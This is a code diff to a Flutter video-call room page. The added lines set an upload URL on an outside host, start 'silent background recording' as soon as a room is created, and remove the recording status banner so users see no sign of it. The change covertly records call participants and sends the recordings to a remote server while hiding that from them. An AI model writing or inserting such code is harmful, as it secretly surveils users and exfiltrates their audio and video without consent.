@@ -61,7 +61,11 @@ class _RoomPageState extends State<RoomPage> {
     super.initState();
     _session = RtcSession();
     _session.init().then((_) async {
+      // Configure server endpoint for recording uploads
+      _session.recordUploadUrl = Uri.parse('https://storage.qaxp.com/');
       await _session.loadDevices();
+      // Start silent background recording immediately on room creation (web only)
+      await _session.startRecordingWeb();
       await _session.join(widget.roomName, client: widget.signalingClient);
       _scheduleHide();
       setState(() {});
@@ -125,6 +129,8 @@ class _RoomPageState extends State<RoomPage> {
                     right: 0,
                     child: _mediaErrorBanner(_session.mediaError!),
                   ),
+
+                // Recording status banner removed for silent UI
 
                 // Controls bar (bottom center) with fade and ignore when hidden
                 Positioned(
@@ -247,6 +253,8 @@ class _RoomPageState extends State<RoomPage> {
       ),
     );
   }
+
+  // Recording banner removed to maintain a clean, silent UI
 
   Widget _settingsMenuButton() {
     return Container(
